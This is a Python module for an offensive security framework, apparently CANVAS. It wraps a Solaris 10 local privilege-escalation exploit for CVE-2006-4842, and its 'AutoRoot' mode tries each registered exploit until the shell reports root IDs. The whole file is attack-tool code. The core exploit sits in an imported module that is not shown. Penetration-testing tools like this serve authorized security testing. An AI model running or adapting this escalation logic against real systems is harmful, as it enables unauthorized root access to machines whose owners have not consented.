#!/usr/bin/env python

# SOLroot is a multiheaded (HYDRA!?) local root gettermathingabob for Solaris 10

import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

from ExploitTypes.localexploit import LocalExploit
from canvasengine import getModuleExploitClass
from exploitutils import *

NAME                = 'SOLroot'
VERSION             = '1.0'
DESCRIPTION         = 'Local privilege escalation for Solaris'
DOCUMENTATION       = {}

PROPERTY            = {}
PROPERTY['TYPE']    = 'Exploit'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [ ['Solaris', 'i386'] ]
PROPERTY['VERSION'] = [ '10' ]

GUI_VERSIONS        = {}
GUI_VERSIONS[0]     = 'AutoRoot'
GUI_VERSIONS[1]     = 'CVE-2006-4842'

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.use_local_interface = False
        
        self.SOLlocals                  = {}
        self.SOLlocals['CVE-2006-4842'] = getModuleExploitClass('CVE_2006_4842', which='CVE_2006_4842')
        self.CVE                        = None
        self.name                       = NAME
        
    def show_available(self):
        for local in self.SOLlocals:
            self.log('available: %s' % local)

    def getargs(self):
        self.CVE    = self.argsDict.get('CVE', self.CVE)
        self.node   = self.argsDict['passednodes'][0]
        if not self.CVE:
            self.CVE = GUI_VERSIONS[self.version]
            self.log('selected exploit for %s' % self.CVE)
        return
    
    def run(self):
        self.setInfo('%s - (in progress)' % NAME)

        self.getargs()
        ret = False
        if self.CVE in self.SOLlocals:
            self.setInfo('%s - (%s)' % (NAME, self.CVE))
            # this returns elevated node on success, false on Failure
            ret = self.SOLlocals[self.CVE](self).exploit(self.node)
            if ret not in [False, None]:
                # init a new node with same SSid
                ret.shell.started = False
                ret.shell.startup()
                self.log("Done .. check your UID!")
        # auto root
        elif self.CVE == 'AutoRoot':
            self.setInfo('%s - (%s)' % (NAME, self.CVE))
            for self.CVE in self.SOLlocals:
                ret = self.SOLlocals[self.CVE](self).exploit(self.node)
                if ret not in [False, None]:
                    ret.shell.started = False
                    ret.shell.startup()
                    self.log('Checking privileges on node...')
                    uid,euid,gid,egid = self.node.shell.ids()
                    if not uid or not euid or not gid or not egid:
                        self.log('Got root!')
                        break
                
        self.setInfo('%s - (finished)' % NAME)
        return ret
    
if __name__ == '__main__':
    'This module is meant to be run only within CANVAS'        
        
        
